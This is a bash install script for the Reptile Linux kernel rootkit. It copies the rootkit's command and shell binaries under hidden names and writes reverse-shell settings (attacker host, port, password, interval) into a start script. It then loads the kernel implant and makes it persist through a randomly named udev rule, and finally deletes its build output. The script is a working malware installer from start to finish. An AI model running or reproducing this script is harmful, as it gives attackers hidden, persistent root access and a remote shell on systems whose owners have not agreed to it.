#!/bin/bash

function random_gen_dec {
	RETVAL=$(shuf -i 50-99 -n 1)
}

PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)"
[ $? -ne 0 ] && PWD="$(cd "$(dirname $0)" && pwd)"
source "${BASH_SOURCE%/*}/../.config" || \
{ echo "Error: no .config file found!"; exit; }

UDEV_DIR=/lib/udev
random_gen_dec && NAME=$RETVAL-$HIDE.rules
RULE=/lib/udev/rules.d/$NAME
[ ! -d /lib/udev/rules.d ] && RULE=/etc/udev/rules.d/$NAME

# Create Reptile's folder
mkdir -p $INSTALL_DIR && \

# Copy "cmd" binary
cp $PWD/../output/cmd $INSTALL_DIR/$HIDE"_cmd" && \

# Copy "shell" binary
cp $PWD/../output/shell $INSTALL_DIR/$HIDE"_shell" && \

# Copy "bashrc"
cp $PWD/../scripts/bashrc $INSTALL_DIR/$HIDE"_rc" && \

# Copy "server-certificate.pem"
cp $PWD/../userland/transport/server-certificate.pem /$HIDE/$HIDE"_cert.pem"

# Create start script
cp $PWD/../scripts/start $INSTALL_DIR/$HIDE"_start" && \
sed -i s!XXXXX!$TAG_NAME! $INSTALL_DIR/$HIDE"_start" && \
sed -i s!\#CMD!$INSTALL_DIR/$HIDE"_cmd"! $INSTALL_DIR/$HIDE"_start" && \
if [ "$CONFIG_RSHELL_ON_START" == "y" ]; then
	sed -i s!\#SHELL!$INSTALL_DIR/$HIDE"_shell"! $INSTALL_DIR/$HIDE"_start" && \
	sed -i s!LHOST!$LHOST! $INSTALL_DIR/$HIDE"_start" && \
	sed -i s!LPORT!$LPORT! $INSTALL_DIR/$HIDE"_start" && \
	sed -i s!PASS!$PASSWORD! $INSTALL_DIR/$HIDE"_start" && \
	sed -i s!INTERVAL!$INTERVAL! $INSTALL_DIR/$HIDE"_start" && \
	true || false;
fi

# Permissions
chmod 777 $INSTALL_DIR/* && \

# Copy kernel implant
cp $PWD/../output/reptile $INSTALL_DIR/$HIDE && \

# Make persistent
cp $PWD/../output/reptile $UDEV_DIR/$HIDE && \
sed s!\#IMPLANT!$INSTALL_DIR/$HIDE! $PWD/../scripts/rule > $PWD/../output/rule
cp $PWD/../output/rule $RULE && \

# cleaning output dir
rm -rf $PWD/../output && \

# Load Reptile
$INSTALL_DIR/$HIDE && \

echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

# How to Uninstall
echo -e "UNINSTALL:\n"
echo -e "$INSTALL_DIR/$HIDE""_cmd show"
echo -e "rmmod reptile_module"
echo -e "rm -rf $INSTALL_DIR $RULE $UDEV_DIR/$HIDE"
echo